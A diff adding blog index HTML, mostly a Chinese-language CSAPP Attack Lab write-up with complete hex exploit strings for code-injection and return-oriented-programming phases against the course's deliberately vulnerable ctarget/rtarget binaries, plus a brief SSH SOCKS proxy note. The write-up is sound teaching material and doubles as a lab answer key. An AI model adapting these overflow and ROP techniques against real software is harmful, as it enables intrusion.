@@ -210,6 +210,483 @@
             
               
                 
+                <a class="post-title-link" href="/2016/05/13/Mac/" itemprop="url">
+                  Untitled
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-05-13T15:35:45+08:00" content="2016-05-13">
+              2016-05-13
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>layout: openshift<br>title: OpenShift 搭梯子记录 for Mac<br>date: 2016-02-05 23:12:35</p>
+<p>tags: [翻墙,OpenShift]</p>
+<h1 id="OpenShift__u642D_u68AF_u5B50_u8BB0_u5F55_for_Mac"><a href="#OpenShift__u642D_u68AF_u5B50_u8BB0_u5F55_for_Mac" class="headerlink" title="OpenShift 搭梯子记录 for Mac"></a>OpenShift 搭梯子记录 for Mac</h1><h2 id="OpenShift_u5EFA_u7ACB_u5E94_u7528_u7A0B_u5E8F"><a href="#OpenShift_u5EFA_u7ACB_u5E94_u7528_u7A0B_u5E8F" class="headerlink" title="OpenShift建立应用程序"></a>OpenShift建立应用程序</h2><h3 id="u6CE8_u518C"><a href="#u6CE8_u518C" class="headerlink" title="注册"></a>注册</h3><p>注册及邮箱验证完成后进入openshift管理页面</p>
+<h3 id="u521B_u5EFA_u5E94_u7528_u7A0B_u5E8F"><a href="#u521B_u5EFA_u5E94_u7528_u7A0B_u5E8F" class="headerlink" title="创建应用程序"></a>创建应用程序</h3><p>在创建应用程序页面选择Do-It-Yourself </p>
+<h3 id="u8BBE_u5B9A_u5E94_u7528_u7A0B_u5E8FURL_u5E76_u521B_u5EFA"><a href="#u8BBE_u5B9A_u5E94_u7528_u7A0B_u5E8FURL_u5E76_u521B_u5EFA" class="headerlink" title="设定应用程序URL并创建"></a>设定应用程序URL并创建</h3><p>在下一步的页面中设置应用的URL，并创建之</p>
+<h3 id="SSH_u767B_u9646_u8BBE_u7F6E"><a href="#SSH_u767B_u9646_u8BBE_u7F6E" class="headerlink" title="SSH登陆设置"></a>SSH登陆设置</h3><p>应用页面中SSH的公钥还没有设置，可以使用OPENSHIFT的rhc程序来设置。在Terminal中输入sudo gem install rhc安装</p>
+<p>安装完毕后执行rhc setup命令，输入OPENSHIFT网站的登陆账号和密码!</p>
+<p>此步骤完成后SSH公钥应该就被导入到OPENSHIFT的账户中了，但是我的网页一直不显示成功。在Terminal中运行rhc apps，若能看到SSH则可以进行下一步。</p>
+<h2 id="u5728Mac_u4E0B_u8BBE_u7F6EProxy"><a href="#u5728Mac_u4E0B_u8BBE_u7F6EProxy" class="headerlink" title="在Mac下设置Proxy"></a>在Mac下设置Proxy</h2><p>运行ssh -D <port number=""> <ssh address="">， 只要不exit则本地流量会经指定的port转发!在Mac的网络设置中设置SOCKS代理即可</ssh></port></p>
+
+          
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/12/CSAPP-Lab3-Attack-Lab/" itemprop="url">
+                  CSAPP Lab3 - Attack Lab
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-05-12T09:46:57+08:00" content="2016-05-12">
+              2016-05-12
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><h2 id="Redirct"><a href="#Redirct" class="headerlink" title="Redirct"></a>Redirct</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">Command</th>
+<th style="text-align:center">Functions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">command &gt; filename</td>
+<td style="text-align:center">command标准输出重定向filename</td>
+</tr>
+<tr>
+<td style="text-align:center">command &gt;&gt; filename</td>
+<td style="text-align:center">command标准输出重定向filename（追加）</td>
+</tr>
+<tr>
+<td style="text-align:center">command &lt; filename</td>
+<td style="text-align:center">command以filename作为标准输入</td>
+</tr>
+<tr>
+<td style="text-align:center">command &lt; filename1 &gt; filename2</td>
+<td style="text-align:center">command以filename1作为标准输入，输出重定向到filename2</td>
+</tr>
+<tr>
+<td style="text-align:center">cat filename \</td>
+<td style="text-align:center">./exec</td>
+<td>cat是连接文件，顺序读取文件并写入标准输出。</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">\</td>
+<td>是管道，将前面程序的标准输出作为后面程序的标准输入</td>
+</tr>
+</tbody>
+</table>
+<h2 id="gdb_u4E2D_uFF0C_u4E24_u79CD_u65B9_u5F0F_u8BBE_u7F6E_u53C2_u6570"><a href="#gdb_u4E2D_uFF0C_u4E24_u79CD_u65B9_u5F0F_u8BBE_u7F6E_u53C2_u6570" class="headerlink" title="gdb中，两种方式设置参数"></a>gdb中，两种方式设置参数</h2><ul>
+<li>set args input.txt</li>
+</ul>
+<ul>
+<li>run &lt; input.txt          (此种情况需先设断点)</li>
+</ul>
+<h2 id="u7F16_u8BD1_u6B65_u9AA4_uFF08_u6BCF_u4E00_u6B65_u4EE5_u4E0A_u4E00_u6B65_u8F93_u51FA_u4E3A_u8F93_u5165_uFF09"><a href="#u7F16_u8BD1_u6B65_u9AA4_uFF08_u6BCF_u4E00_u6B65_u4EE5_u4E0A_u4E00_u6B65_u8F93_u51FA_u4E3A_u8F93_u5165_uFF09" class="headerlink" title="编译步骤（每一步以上一步输出为输入）"></a>编译步骤（每一步以上一步输出为输入）</h2><ol>
+<li>Preprocessor: 处理#include，macro，#define等</li>
+<li>Compiler: 生成汇编语言文件 *.s</li>
+<li>Assembler: 生成二进制object-code文件 *.o。该文件包含所有指令的binary sequence，但是全局变量地址未填充</li>
+<li>Linker：合并若干object-code及调用的library，生成可执行文件</li>
+</ol>
+<h2 id="u5BF9_u5E94_u7684gcc_u3001objdump_u547D_u4EE4"><a href="#u5BF9_u5E94_u7684gcc_u3001objdump_u547D_u4EE4" class="headerlink" title="对应的gcc、objdump命令"></a>对应的gcc、objdump命令</h2><ol>
+<li><p>gcc -S: 使用 <em>.c源文件生成汇编语言文件 </em>.s</p>
+</li>
+<li><p>gcc -c: 使用 <em>.s或 </em>.c文件生成 *.o文件，得到程序的binary sequence</p>
+<ul>
+<li>vim中，打开文件时加参数-b指定二进制方式打开，否则使用xxd会在文件尾加上0x0a</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>使用:%!xxd将文件转换成十六进制，使用:%!xxd -r转换为正常模式</li>
+<li>只要执行了xxd就会提示文件被修改</li>
+</ul>
+<ol>
+<li><p>gcc -o <name>: 使用 <em>.c, </em>.s, *.o任意文件生成可执行文件。-o 后面带可执行文件名</name></p>
+</li>
+<li><p>objdump -d: 对 *.o文件或可执行文件进行反汇编，得到binary sequence及其对应的汇编指令</p>
+</li>
+</ol>
+<h1 id="Lab_uFF1A"><a href="#Lab_uFF1A" class="headerlink" title="Lab："></a>Lab：</h1><h2 id="u51C6_u5907"><a href="#u51C6_u5907" class="headerlink" title="准备"></a>准备</h2><ol>
+<li>使用汇编将要执行的命令写成.s文件</li>
+<li>使用gcc编译.s文件，再用objdump -d进行反汇编，得到对应的byte sequence</li>
+<li>Hex2Raw程序将上述十六进制数据（以空格分隔）变成raw格式数据，并作为输入给ctarget和rtaeget<ul>
+<li>Hex2Raw读取文件应采用little-endian顺序</li>
+<li>exploit string不应包含0x0a(‘\n’)，否则会被target认为是中断字符串</li>
+</ul>
+</li>
+<li>每个人的程序中都内置了自己的cookie，可以在cookie.txt中找到</li>
+<li>gdb调试target时，需要加参数-g才能正确运行</li>
+</ol>
+<h2 id="Part_I_3A_Code_Injection_Attacks"><a href="#Part_I_3A_Code_Injection_Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h3 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h3><h4 id="Lab_Content"><a href="#Lab_Content" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.</p>
+<p>ctarget的getbuf()在test()函数体内执行，如代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span><br><span class="line"></span>&#123; </span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在ctarget中有一个函数touch1()</p>
+<p>此level需要使ctarget执行getbuf()完毕后执行touch1()而不是继续执行test()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span><br><span class="line"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p>通过设断点得知touch1()地址在0x4017c0。进入getbuf()，栈顶向下移动了0x28，传给Gets()的参数是rsp（mov   %rsp,%rdi）。因此从栈顶开始填40byte的数据，再把0x4017c0按照little-endian写进去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;c0 17 40                        /* touch1() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="Lab_Content-1"><a href="#Lab_Content-1" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>Phase 2 involves injecting a small amount of code as part of your exploit string.</p>
+<p>在ctarget中有一个函数touch2()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Touch2!:You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Misfire:You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>); </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要让ctarget执行touch2()而不是回到test()。必须将自己的cookie传给touch2()</p>
+<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p>touch2()地址在0x4017ec。将改地址写入callee的return address位置以调用touch2()。要给touch2()，传递参数，x86_64系统下必须将参数写入%rdi。修改test调用getbuf前写入的return address只能跳转到一个位置，本题需要执行修改寄存器和跳转到touch2()两步。</p>
+<p>每次执行ret都会pop然后把跳转到pop出的地址中，因此要执行多个指令，可以：</p>
+<ul>
+<li>从原return address位置开始按执行顺序向栈底方向一次写入要执行命令</li>
+<li>第一个要执行命令后必须有ret，如果调用函数则自带ret，自己写命令在结束后加上ret</li>
+</ul>
+<p>这样，第一条指令执行完后ret会把第二条指令pop出来并执行，以此类推。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59        /* mov $0x59b997fa,%rdi   func1 */&#10;c3                          /* retq */&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;78 dc 61 55 00 00 00 00     /* jump to func1 */&#10;ec 17 40 00 00 00 00 00     /* touch2() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="Lab_Content-2"><a href="#Lab_Content-2" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>Phase 3 also involves a code injection attack, but passing a string as argument.</p>
+<p>在ctarget中有函数hexmatch()和touch3()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	fail(<span class="number">3</span>); </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要让ctarget执行touch3()而不是回到test()。必须将自己的cookie以string的形式传入（从高位到低位排列的8个十六进制数，不要开头的0x）</p>
+<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><p>touch3()的地址为0x4018fa。把cookie存放首地址存入%rdi。思路和phase2一样，不同的是touch3()接受的参数是char*，因此要把cookie各位以ASCII表示后存入某空间，再把该空间地址赋给%rdi。为避免hexmatch和strncmp覆盖栈内容，将cookie写入test的栈区可防止被覆盖。（callee不会使用到caller的栈）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b0 dc 61 55        /* mov $0x5561dcb0,%rdi   func1 */&#10;c3                          /* retq */&#10;11 12 13 14 15 16 17 18 &#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;78 dc 61 55 00 00 00 00     /* jump to func1 */&#10;fa 18 40 00 00 00 00 00     /* touch3() */&#10;35 39 62 39 39 37 66 61     /* cookie in hex */</span><br></pre></td></tr></table></figure>
+<h2 id="Part_II_3A_Return-Oriented_Programming"><a href="#Part_II_3A_Return-Oriented_Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><ul>
+<li>使用了Stack Randomization，找不到inject code的存放地点</li>
+<li>Stack readable but not executable</li>
+<li>ROP是指在栈中存的若干byte sequences，称为gadget。每个gadget以0xc3结尾，这是ret指令对应的二进制代码。</li>
+<li>以c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)为例，这一句从4thbyte开始的48 89 c7是movq %rax, %rdi，包含一个gardget</li>
+<li>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</li>
+<li>The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</li>
+</ul>
+<h3 id="Level_2-1"><a href="#Level_2-1" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="Lab_Content-3"><a href="#Lab_Content-3" class="headerlink" title="Lab Content"></a>Lab Content</h4><ul>
+<li>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm.</li>
+</ul>
+<ul>
+<li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions <strong>start_farm and mid_farm.</strong></li>
+</ul>
+<h4 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h4><p>start_farm在0x401994，end_farm在0x401ab2，touch2在0x4017ec。找到两个gadget完成存参数和跳转两个功能。gadget farm如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x401994 &#60;start_farm&#62;:  0xb8    0x01    0x00    0x00    0x00    0xc3&#10;0x40199a &#60;getval_142&#62;:  0xb8    0xfb    0x78    0x90    0x90    0xc3&#10;0x4019a0 &#60;addval_273&#62;:  0x8d    0x87    0x48    0x89    0xc7    0xc3    0xc3&#10;0x4019a7 &#60;addval_219&#62;:  0x8d    0x87    0x51    0x73    0x58    0x90    0xc3&#10;0x4019ae &#60;setval_237&#62;:  0xc7    0x07    0x48    0x89    0xc7    0xc7    0xc3&#10;0x4019b5 &#60;setval_424&#62;:  0xc7    0x07    0x54    0xc2    0x58    0x92    0xc3&#10;0x4019bc &#60;setval_470&#62;:  0xc7    0x07    0x63    0x48    0x8d    0xc7    0xc3&#10;0x4019c3 &#60;setval_426&#62;:  0xc7    0x07    0x48    0x89    0xc7    0x90    0xc3&#10;0x4019ca &#60;getval_280&#62;:  0xb8    0x29    0x58    0x90    0xc3    0xc3&#10;0x4019d0 &#60;mid_farm&#62;:    0xb8    0x01    0x00    0x00    0x00    0xc3&#10;0x4019d6 &#60;add_xy&#62;:      0x48    0x8d    0x04    0x37    0xc3&#10;0x4019db &#60;getval_481&#62;:  0xb8    0x5c    0x89    0xc2    0x90    0xc3&#10;0x4019e1 &#60;setval_296&#62;:  0xc7    0x07    0x99    0xd1    0x90    0x90    0xc3&#10;0x4019e8 &#60;addval_113&#62;:  0x8d    0x87    0x89    0xce    0x78    0xc9    0xc3&#10;0x4019ef &#60;addval_490&#62;:  0x8d    0x87    0x8d    0xd1    0x20    0xdb    0xc3&#10;0x4019f6 &#60;getval_226&#62;:  0xb8    0x89    0xd1    0x48    0xc0    0xc3&#10;0x4019fc &#60;setval_384&#62;:  0xc7    0x07    0x81    0xd1    0x84    0xc0    0xc3&#10;0x401a03 &#60;addval_190&#62;:  0x8d    0x87    0x41    0x48    0x89    0xe0    0xc3&#10;0x401a0a &#60;setval_276&#62;:  0xc7    0x07    0x88    0xc2    0x08    0xc9    0xc3&#10;0x401a11 &#60;addval_436&#62;:  0x8d    0x87    0x89    0xce    0x90    0x90    0xc3&#10;0x401a18 &#60;getval_345&#62;:  0xb8    0x48    0x89    0xe0    0xc1    0xc3&#10;0x401a1e &#60;addval_479&#62;:  0x8d    0x87    0x89    0xc2    0x00    0xc9    0xc3&#10;0x401a25 &#60;addval_187&#62;:  0x8d    0x87    0x89    0xce    0x38    0xc0    0xc3&#10;0x401a2c &#60;setval_248&#62;:  0xc7    0x07    0x81    0xce    0x08    0xdb    0xc3&#10;0x401a33 &#60;getval_159&#62;:  0xb8    0x89    0xd1    0x38    0xc9    0xc3&#10;0x401a39 &#60;addval_110&#62;:  0x8d    0x87    0xc8    0x89    0xe0    0xc3    0xc3&#10;0x401a40 &#60;addval_487&#62;:  0x8d    0x87    0x89    0xc2    0x84    0xc0    0xc3&#10;0x401a47 &#60;addval_201&#62;:  0x8d    0x87    0x48    0x89    0xe0    0xc7    0xc3&#10;0x401a4e &#60;getval_272&#62;:  0xb8    0x99    0xd1    0x08    0xd2    0xc3&#10;0x401a54 &#60;getval_155&#62;:  0xb8    0x89    0xc2    0xc4    0xc9    0xc3&#10;0x401a5a &#60;setval_299&#62;:  0xc7    0x07    0x48    0x89    0xe0    0x91    0xc3&#10;0x401a61 &#60;addval_404&#62;:  0x8d    0x87    0x89    0xce    0x92    0xc3    0xc3&#10;0x401a68 &#60;getval_311&#62;:  0xb8    0x89    0xd1    0x08    0xdb    0xc3&#10;0x401a6e &#60;setval_167&#62;:  0xc7    0x07    0x89    0xd1    0x91    0xc3    0xc3&#10;0x401a75 &#60;setval_328&#62;:  0xc7    0x07    0x81    0xc2    0x38    0xd2    0xc3&#10;0x401a7c &#60;setval_450&#62;:  0xc7    0x07    0x09    0xce    0x08    0xc9    0xc3&#10;0x401a83 &#60;addval_358&#62;:  0x8d    0x87    0x08    0x89    0xe0    0x90    0xc3&#10;0x401a8a &#60;addval_124&#62;:  0x8d    0x87    0x89    0xc2    0xc7    0x3c    0xc3&#10;0x401a91 &#60;getval_169&#62;:  0xb8    0x88    0xce    0x20    0xc0    0xc3&#10;0x401a97 &#60;setval_181&#62;:  0xc7    0x07    0x48    0x89    0xe0    0xc2    0xc3&#10;0x401a9e &#60;addval_184&#62;:  0x8d    0x87    0x89    0xc2    0x60    0xd2    0xc3&#10;0x401aa5 &#60;getval_472&#62;:  0xb8    0x8d    0xce    0x20    0xd2    0xc3&#10;0x401aab &#60;setval_350&#62;:  0xc7    0x07    0x48    0x89    0xe0    0x90    0xc3&#10;0x401ab2 &#60;end_farm&#62;:    0xb8    0x01    0x00    0x00    0x00    0xc3</span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4019a7 &#60;addval_219&#62;:  0x8d    0x87    0x51    0x73    0x58    0x90    0xc3</span><br></pre></td></tr></table></figure>
+<p>这一行5th byte开始包含gadget   popl %rax;  nop;  ret;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4019a0 &#60;addval_273&#62;:  0x8d    0x87    0x48    0x89    0xc7    0xc3    0xc3</span><br></pre></td></tr></table></figure>
+<p>这一行3th byte开始包含gadget   movq %rax,%rdi</p>
+<p>利用这两条就可以把放在栈顶的参数cookie通过%rax传给%rdi，然后执行touch2()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;ab 19 40 00 00 00 00 00  /* 0x4019a7: 0x8d 0x87 0x51 0x73 0x58 0x90 0xc3, popl %rax */&#10;fa 97 b9 59 00 00 00 00  /* cookie */&#10;a2 19 40 00 00 00 00 00  /* 0x4019a0: 0x8d 0x87 0x48 0x89 0xc7 0xc3 0xc3, movq %rax,%rdi */&#10;ec 17 40 00 00 00 00 00  /* touch2() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_3-1"><a href="#Level_3-1" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="Lab_Content-4"><a href="#Lab_Content-4" class="headerlink" title="Lab Content"></a>Lab Content</h4><ul>
+<li>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie.</li>
+<li>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions <strong>start_farm and end_farm.</strong></li>
+</ul>
+<h4 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h4><ul>
+<li>movl在x86-64上会把高32bit清零，movb和movw则不会改变高8/16bit的值</li>
+</ul>
+<p>gadget中有个add_xy()函数，在gdb中反编译可以看到，它将%rdi和%rsi的值相加后赋给了%rax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function add_xy:&#10;   0x00000000004019d6 &#60;+0&#62;:     lea    (%rdi,%rsi,1),%rax&#10;   0x00000000004019da &#60;+4&#62;:     retq</span><br></pre></td></tr></table></figure>
+<p>getbuf()刚return回来后将当前%rsp通过%rax存到%rdi，将一个偏移量存到栈上,经过 </p>
+<p>popl %rax -&gt; movl %eax,%edx -&gt; movl %edx,%ecx -&gt;%esi存到%rsi，再调用add_xy即可得到一个指定位置的地址，在这里我们存入cookie in hex。执行mov %rax,%rdi，存入%rdi后调用touch3()即可完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;06 1a 40 00 00 00 00 00  /* 0x401a03: 0x8d 0x87 0x41 0x48 0x89 0xe0 0xc3, movq %rsp,%rax */&#10;c5 19 40 00 00 00 00 00  /* 0x4019c3: 0xc7 0x07 0x48 0x89 0xc7 0x90 0xc3&#65292;movq %rax,%rdi */&#10;ab 19 40 00 00 00 00 00  /* 0x4019a7: 0x8d 0x87 0x51 0x73 0x58 0x90 0xc3, popl %rax */&#10;48 00 00 00 00 00 00 00  /* offset 0x48 bytes */&#10;dd 19 40 00 00 00 00 00  /* 0x4019db: 0xb8 0x5c 0x89 0xc2 0x90 0xc3, mov %eax,%edx */&#10;69 1a 40 00 00 00 00 00  /* 0x401a68: 0xb8 0x89 0xd1 0x08 0xdb 0xc3, mov %edx, %ecx */&#10;27 1a 40 00 00 00 00 00  /* 0x401a25: 0x8d 0x87 0x89 0xce 0x38 0xc0 0xc3, mov %ecx,%esi */&#10;d6 19 40 00 00 00 00 00  /* 0x4019d6: &#60;add_xy&#62;: 0x48 0x8d 0x04 0x37 0xc3 */&#10;c5 19 40 00 00 00 00 00  /* 0x4019c3: 0xc7 0x07 0x48 0x89 0xc7 0x90 0xc3&#65292;movq %rax,%rdi */&#10;fa 18 40 00 00 00 00 00  /* touch3() */&#10;35 39 62 39 39 37 66 61  /* cookie in hex */</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/12/CSAPP-Lab2-Bomb-Lab/" itemprop="url">
+                  CSAPP Lab2 - Bomb Lab
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-05-12T09:46:42+08:00" content="2016-05-12">
+              2016-05-12
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
